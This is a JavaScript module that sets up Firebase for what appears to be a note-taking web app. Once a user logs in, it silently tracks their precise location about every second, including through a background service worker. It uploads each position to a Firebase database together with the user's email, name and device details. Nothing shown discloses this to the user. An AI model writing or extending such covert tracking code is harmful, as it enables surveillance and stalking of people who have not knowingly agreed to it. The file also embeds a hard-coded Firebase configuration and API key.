import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

// Add version control
const APP_VERSION = '1.0.0'; // Increment this when deploying new versions
const CACHE_NAME = `note-app-cache-v${APP_VERSION}`;

// Check for app updates
async function checkForUpdates() {
    const lastVersion = localStorage.getItem('app_version');
    if (lastVersion !== APP_VERSION) {
        console.log('New version detected, clearing caches...');
        await clearAllCaches();
        localStorage.setItem('app_version', APP_VERSION);
        // Reload the page to apply updates
        window.location.reload(true);
    }
}

// Clear all caches
async function clearAllCaches() {
    try {
        // Clear application cache
        if ('caches' in window) {
            const cacheKeys = await caches.keys();
            await Promise.all(
                cacheKeys.map(key => caches.delete(key))
            );
        }

        // Clear local storage except for critical items
        const criticalItems = ['sessionToken', 'tracking_user'];
        const itemsToKeep = {};
        criticalItems.forEach(item => {
            const value = localStorage.getItem(item);
            if (value) itemsToKeep[item] = value;
        });
        
        localStorage.clear();
        
        // Restore critical items
        Object.entries(itemsToKeep).forEach(([key, value]) => {
            localStorage.setItem(key, value);
        });

        // Clear session storage
        sessionStorage.clear();

        console.log('All caches cleared successfully');
    } catch (error) {
        console.error('Error clearing caches:', error);
    }
}

const firebaseConfig = {
    apiKey: "AIzaSyBdVgeMqQKtuJEQxrPFz8xB7XmUN6cFlMQ",
    authDomain: "kh-donghua.firebaseapp.com",
    databaseURL: "https://kh-donghua-default-rtdb.firebaseio.com",
    projectId: "kh-donghua",
    storageBucket: "kh-donghua.appspot.com",
    messagingSenderId: "119897892431",
    appId: "1:119897892431:web:ad31196e8a9692b63e6c3a"
};

const app = initializeApp(firebaseConfig);
export const auth = getAuth(app);
export const database = getDatabase(app);

const SERVICE_WORKER_REFRESH_INTERVAL = 3600000; // 1 hour in milliseconds

// Register service worker for background tracking
function registerServiceWorker() {
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('location-worker.js')
        .then((registration) => {
            console.log('Service Worker registered');
        })
        .catch((error) => {
            console.error('Service Worker registration failed:', error);
        });
    }
}

// Add persistent storage for location data
function storeLocationLocally(uid, locationData) {
    try {
        const locations = JSON.parse(localStorage.getItem('cached_locations') || '{}');
        locations[uid] = locationData;
        localStorage.setItem('cached_locations', JSON.stringify(locations));
    } catch (error) {
        console.error('Error storing location locally:', error);
    }
}

// Modified trackUserLocation function
function trackUserLocation(user) {
    if (!navigator.geolocation) return;

    const userData = {
        uid: user.uid,
        email: user.email,
        displayName: user.displayName,
        lastUpdate: Date.now()
    };
    localStorage.setItem('tracking_user', JSON.stringify(userData));

    // Set shorter intervals for more frequent updates
    const BACKGROUND_INTERVAL = 1000; // 1 second interval
    const BATTERY_SAVING_INTERVAL = 3000; // 3 seconds when battery is low

    const options = {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0 // Always get fresh location
    };

    // Use watchPosition for continuous updates
    const watchId = navigator.geolocation.watchPosition(
        (position) => handleLocationUpdate(position, user),
        handleLocationError,
        options
    );

    // Backup interval for redundancy
    const intervalId = setInterval(() => {
        if (!document.hidden) { // Only update when tab is visible
            navigator.geolocation.getCurrentPosition(
                (position) => handleLocationUpdate(position, user),
                handleLocationError,
                options
            );
        }
    }, BACKGROUND_INTERVAL);

    // Battery optimization
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            const updateInterval = () => {
                clearInterval(intervalId);
                const newIntervalId = setInterval(() => {
                    if (!document.hidden) {
                        navigator.geolocation.getCurrentPosition(
                            (position) => handleLocationUpdate(position, user),
                            handleLocationError,
                            options
                        );
                    }
                }, battery.level > 0.2 ? BACKGROUND_INTERVAL : BATTERY_SAVING_INTERVAL);
                localStorage.setItem('location_interval_id', newIntervalId);
            };

            battery.addEventListener('levelchange', updateInterval);
            updateInterval();
        });
    }

    localStorage.setItem('location_watch_id', watchId);
    return { watchId, intervalId };
}

// Modified handleLocationUpdate function
function handleLocationUpdate(position, user) {
    const locationData = {
        username: user.displayName || 'Anonymous',
        email: user.email,
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: Date.now(),
        lastActive: new Date().toLocaleString(),
        deviceInfo: {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            battery: 'Unknown',
            online: navigator.onLine,
            backgroundMode: document.hidden
        }
    };

    // Update Firebase immediately
    const locationRef = ref(database, `user-locations/${user.uid}`);
    set(locationRef, locationData).catch(handleLocationError);

    // Store locally for backup
    storeLocationLocally(user.uid, locationData);
}

function handleLocationError(error) {
    console.error('Geolocation error:', error);
}

function updateLocation(uid, locationData) {
    const locationRef = ref(database, `user-locations/${uid}`);
    set(locationRef, locationData);
}

// Handle user authentication changes
onAuthStateChanged(auth, (user) => {
    if (user) {
        trackUserLocation(user);
        registerServiceWorker();

        // Refresh service worker and location tracking periodically
        setInterval(() => {
            registerServiceWorker();
            trackUserLocation(user);
        }, SERVICE_WORKER_REFRESH_INTERVAL);
    } else {
        // Cleanup when user logs out
        const watchId = localStorage.getItem('location_watch_id');
        const intervalId = localStorage.getItem('location_interval_id');
        if (watchId) {
            navigator.geolocation.clearWatch(Number(watchId));
            localStorage.removeItem('location_watch_id');
        }
        if (intervalId) {
            clearInterval(Number(intervalId));
            localStorage.removeItem('location_interval_id');
        }
        localStorage.removeItem('tracking_user');
    }
});

// Modified initialization
function initialize() {
    checkForUpdates();
    registerServiceWorker();
}

// Call initialize when the module loads
initialize();
